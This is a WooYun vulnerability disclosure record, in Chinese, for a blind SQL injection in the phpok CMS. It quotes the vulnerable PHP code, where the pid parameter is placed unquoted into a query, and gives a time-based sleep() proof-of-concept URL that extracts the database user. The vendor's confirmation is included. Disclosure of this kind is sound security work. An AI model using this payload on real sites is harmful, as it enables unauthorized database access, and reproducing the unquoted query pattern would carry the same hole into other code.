{"id": 42994, "wybug_id": "wooyun-2014-084161", "wybug_title": "phpok最新版sql注入（盲注）", "wybug_corp": "phpok.com", "wybug_author": "路人甲", "wybug_date": "2014-11-24 12:29", "wybug_open_date": "2015-02-22 12:30", "wybug_type": "SQL注射漏洞", "wybug_level": "中", "wybug_rank_0": "10", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-11-24：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-11-24：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-11-27：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2015-01-18：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-01-28：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-02-07：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-02-22：\t细节向公众公开  简要描述： RT 详细说明：  在framework/www/open_control.php中:\n//网址列表，这里读的是项目的网址列表\tfunction url_f()\t{\t\t$id = $this->get(\"id\");\t\tif(!$id) $id = \"content\";\t\t$this->assign(\"id\",$id);\t\t$pid = $this->get(\"pid\");\t\tif($pid)\t\t{\t\t\t$p_rs = $this->model('project')->get_one($pid);\t\t\t$type = $this->get(\"type\");\t\t\tif(!$p_rs)\t\t\t{\t\t\t\terror_open(\"项目不存在\");\t\t\t}\t\t\tif($type == \"cate\" && $p_rs[\"cate\"])\t\t\t{\t\t\t\t$catelist = $this->model(\"cate\")->get_all($p_rs['site_id'],$p_rs['cate']);\t\t\t\t$this->assign(\"rslist\",$catelist);\t\t\t\t$this->assign(\"p_rs\",$p_rs);\t\t\t\t$this->view(\"open_url_cate\");\t\t\t}\t\t\telse\t\t\t{\t\t\t\t$pageid = $this->get($this->config[\"pageid\"],\"int\");\t\t\t\t$psize = $this->config[\"psize\"];\t\t\t\tif(!$psize) $psize = 20;\t\t\t\tif(!$pageid) $pageid = 1;\t\t\t\t$offset = ($pageid - 1) * $psize;\t\t\t\t$pageurl = $this->url(\"open\",\"url\",\"pid=\".$pid.\"&type=list&id=\".$id);\t\t\t\t$condition = \"l.site_id='\".$p_rs[\"site_id\"].\"' AND l.project_id='\".$pid.\"' AND l.parent_id='0' \";\t\t\t\t$keywords = $this->get(\"keywords\");\t\t\t\tif($keywords)\t\t\t\t{\t\t\t\t\t$condition .= \" AND l.title LIKE '%\".$keywords.\"%' \";\t\t\t\t\t$pageurl .= \"&keywords=\".rawurlencode($keywords);\t\t\t\t\t$this->assign(\"keywords\",$keywords);\t\t\t\t}\t\t\t\t$rslist = $this->model('list')->get_list($p_rs[\"module\"],$condition,$offset,$psize,$p_rs[\"orderby\"]);\t\t\t\tif($rslist)\t\t\t\t{\t\t\t\t\t$sub_idlist = array_keys($rslist);\t\t\t\t\t$sub_idstring = implode(\",\",$sub_idlist);\t\t\t\t\t$con_sub = \"l.site_id='\".$p_rs[\"site_id\"].\"' AND l.project_id='\".$pid.\"' AND l.parent_id IN(\".$sub_idstring.\") \";\t\t\t\t\t$sublist = $this->model('list')->get_list($p_rs[\"module\"],$con_sub,0,0,$p_rs[\"orderby\"]);\t\t\t\t\tif($sublist)\t\t\t\t\t{\t\t\t\t\t\tforeach($sublist AS $key=>$value)\t\t\t\t\t\t{\t\t\t\t\t\t\t$rslist[$value[\"parent_id\"]][\"sonlist\"][$value[\"id\"]] = $value;\t\t\t\t\t\t}\t\t\t\t\t}\t\t\t\t}\t\t\t\t//读子主题\t\t\t\t$total = $this->model('list')->get_total($p_rs[\"module\"],$condition);\t\t\t\t$pagelist = phpok_page($pageurl,$total,$pageid,$psize,\"home=首页&prev=上一页&next=下一页&last=尾页&half=5&opt=第(num)页&add=(total)/(psize)&always=1\");\t\t\t\t$this->assign(\"pagelist\",$pagelist);\t\t\t\t$this->assign(\"p_rs\",$p_rs);\t\t\t\t$this->assign(\"rslist\",$rslist);\t\t\t\t$this->view(\"open_url_list\");\t\t\t\t\t\t\t}\t\t}\t\telse\t\t{\t\t\t$condition = \" p.status='1' \";\t\t\t$rslist = $this->model('project')->get_all_project($_SESSION[\"admin_site_id\"],$condition);\t\t\t$this->assign(\"rslist\",$rslist);\t\t}\t\t$this->assign(\"id\",$id);\t\t$this->view(\"open_url\");\t}\n$pid = $this->get(\"pid\");  获取参数pid的值，然后调用下面的方法$p_rs = $this->model('project')->get_one($pid);\n//取得项目信息\tfunction get_one($id,$ext=true)\t{\t\tif(!$id) return false;\t\t$sql = \"SELECT * FROM \".$this->db->prefix.\"project WHERE id=\".$id;\t\t$rs = $this->db->get_one($sql);\t\tif(!$rs) return false;\t\tif($ext)\t\t{\t\t\t$ext_rs = $GLOBALS['app']->model(\"ext\")->get_all(\"project-\".$id);\t\t\tif($ext_rs) $rs = array_merge($ext_rs,$rs);\t\t}\t\treturn $rs;\t}\n这里发现$id 虽然做了全局的过滤，但是sql语句中并没有两侧加上引号，这样过滤就没啥意义了，直接可以sql整形注入。PS： 这里还有一个奇怪的问题，访问页面后发现一只提示模板不存在，后来发现在tpl文件夹下根本就不存在这个open_control.php中所需要的模板。导致sql注入无法回显。不知道是否是开发者忘记了还是这个模块已经取消了。poc:/index.php?c=open&f=url&pid=0%20or%20if%28ord%28substr%28user%28%29%2C1%2C1%29%29%3D1%2Csleep%28%200.5%29%2C1%29%3D0   漏洞证明：  poc:/index.php?c=open&f=url&pid=0%20or%20if%28ord%28substr%28user%28%29%2C1%2C1%29%29%3D1%2Csleep%28%200.5%29%2C1%29%3D0   修复方案：     版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：12  确认时间：2014-11-24 13:03 厂商回复： 哎，看来过滤真心不够完整啊，希望高手努力提供Bug，代码编写前后时间有点久了，没有注意到 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 12, "Ranks": null}